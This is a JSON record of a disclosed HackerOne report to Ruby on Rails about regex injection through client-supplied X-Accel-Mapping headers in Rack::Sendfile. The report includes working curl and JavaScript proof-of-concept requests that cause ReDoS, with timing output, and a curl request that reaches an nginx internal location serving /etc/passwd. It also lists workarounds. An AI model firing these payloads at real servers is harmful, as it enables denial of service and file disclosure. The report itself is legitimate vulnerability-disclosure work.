@@ -1,0 +1,111 @@
+{
+  "id": 1057216,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDU3MjE2",
+  "url": "https://hackerone.com/reports/1057216",
+  "title": "Regex Injection from request header (Rack::Sendfile, send_file)",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2020-12-12T02:57:06.852Z",
+  "submitted_at": "2020-12-12T02:57:06.870Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-06-15T17:43:06.159Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-09T16:53:09.611Z",
+  "team_member_agreed_on_going_public_at": "2021-06-15T17:43:06.078Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I have confirmed that [Rack::Sendfile](https://github.com/rack/rack/blob/v2.2.2/lib/rack/sendfile.rb) and the Rails [send_file](https://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_file) that handles it have a problem handling custom headers for request.\n\nIt is expected that the `X-Sendfile-type` and `X-Accel-Mapping` headers will be sent from nginx, but these headers can also be sent from a user agent such as a browser. This allows Regexp injection to cause unexpected regular expression behavior.\n\nhttps://github.com/rack/rack/blob/v2.2.2/lib/rack/sendfile.rb#L143\n\n```ruby\ndef variation(env)\n  @variation ||\n    env['sendfile.type'] ||\n    env['HTTP_X_SENDFILE_TYPE']\nend\n\ndef map_accel_path(env, path)\n  if mapping = @mappings.find { |internal, _| internal =~ path }\n    path.sub(*mapping)\n  elsif mapping = env['HTTP_X_ACCEL_MAPPING']\n    mapping.split(',').map(&:strip).each do |m|\n      internal, external = m.split('=', 2).map(&:strip)\n      new_path = path.sub(/^#{internal}/i, external)\n      return new_path unless path == new_path\n    end\n    path\n  end\nend\n```    \n\nIf not set on the application side, the value used for `internal` can be sent from the request header.\n\nThis problem seems to be a problem on the Rack side, but since it has a large impact on Rails and a vulnerability in Rack has been reported to Rails in the past(https://hackerone.com/reports/431561, https://hackerone.com/reports/895727), I will submit it here. \n\n### Case 1. ReDoS via Regex Injection\n\nExample of rails controller.\n\n```ruby\nclass FilesController < ApplicationController\n  def index\n    send_file(\"./README.md\")\n  end\nend\n```\n\nOr a simple example of rack app.\n\n```ruby\nclass SendFile\n  def call(env)\n    [ 200,\n      {        },\n\n      File.open(\"./config.ru\")\n    ]\n  end\nend\n\nuse Rack::Sendfile\nrun SendFile.new\n```\n\nAn example of a curl attack on these servers.\n\n```\ncurl -i -H 'X-Sendfile-type:X-Accel-Redirect' -H 'X-Accel-Mapping:(([^\\r])+.)+[^\\r]([\\r])+=/www/' http://localhost:3000/files\n```\n\n[ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS#redos-via-regex-injection) is possible because the value of `X-Accel-Mapping` is used for the regular expression.\n\nExecuting the curl code will increase the CPU usage on the server side.In puma, the server becomes unresponsive when requests are made for the number of wokrers. When I try to start puma threads as 5 on my local machine, running curl 5 times makes the server unresponsive!\n\n```\n$ time ruby -e 'puts (\"a\"*32).gsub(/^(([^\\r])+.)+[^\\r]([\\r])+/, \"test\")'\n...\n0.23s user 0.04s system 56% cpu 0.479 total\n\n$ time ruby -e 'puts (\"a\"*40).gsub(/^(([^\\r])+.)+[^\\r]([\\r])+/, \"test\")'\n...\n8.03s user 0.04s system 97% cpu 8.242 total\n\n$ time ruby -e 'puts (\"a\"*44).gsub(/^(([^\\r])+.)+[^\\r]([\\r])+/, \"test\")'\n...\n55.92s user 0.16s system 99% cpu 56.370 total\n```\n\nHow long it actually takes depends on the depth of the path where the server is located. It is also possible to send a more dangerous regular expression than the example.\n\nFrom javascript it will be as follows.\n\n```javascript\nfetch(\"http://localhost:3000/file\", {headers: {\"X-Sendfile-type\":\"X-Accel-Redirect\", \"X-Accel-Mapping\":\"(([^\\\\r])+.)+[^\\\\r]([\\\\r])+=/www/\"}})\n```\n\n\n### Case 2. Unexpected access to internal\n\nExample nginx.conf.\n\n```\nevents {\n    worker_connections  16;\n}\nhttp {\n    server {\n        listen 80;\n        server_name localhost;\n\n        location /rails {\n            proxy_pass http://rails_app/;\n            \n            proxy_redirect off;\n        }\n\n        location /secret_internal {\n            internal;\n            alias /etc/passwd;\n        }\n    }\n}\n```\n\n```\ncurl -i -H 'X-Sendfile-type:X-Accel-Redirect' -H 'X-Accel-Mapping:/.*=/secret_internal' http://localhost:80/rails/files\n```\n\nYou can get `/etc/passwd`, a file that should not be accessible.\n\n## Impact\n\nAffects various Rails applications that use send_file with [Rack 1.1.0](https://github.com/rack/rack/commit/981f182bcfa1b848aa9e66c72500d855f6ee77ff\n) and later versions.\n\nThis can be confirmed by requesting a location that handles file downloads, so if this vulnerability information is disclosed, it may be tried in many locations. It is difficult to guess where case2 will occur, but case1 is simple. Especially in OSS, the attacker can easily check because the place of use is known.\n\nThe following patterns are affected.\n\n* Applications that do not set a value for `x_sendfile_header`.\nIf set `config.action_dispatch.x_sendfile_header = ''`, it will be workaround.\n\n* Using X-Accel-Redirect, but X-Accel-Mapping is not set.\nIt becomes workaround by adding X-Accel-Mapping to all proxy settings of nginx.\n\nI think it's safe to stop using custom headers for requests in Rack. But it's a breaking change.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "0xwise",
+    "trucmai",
+    "aecherli",
+    "ekgaribadmi"
+  ],
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
